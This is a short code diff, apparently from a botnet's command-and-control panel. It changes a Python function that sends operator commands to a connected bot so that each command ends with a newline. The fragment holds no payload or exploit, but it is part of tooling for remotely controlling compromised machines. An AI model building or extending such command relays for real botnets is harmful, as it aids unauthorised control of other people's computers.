@@ -65,7 +65,7 @@ def send(cmd):
     # raw_output = b''
     try:
         # raw_output = allConnections[connected].send(cmd['data'])
-        botnet.getConnection(connected).send(cmd['data'])
+        botnet.getConnection(connected).send(cmd['data']+"\n")
     except:
         # This emit makes sense since it's exceptional
         emit('response',
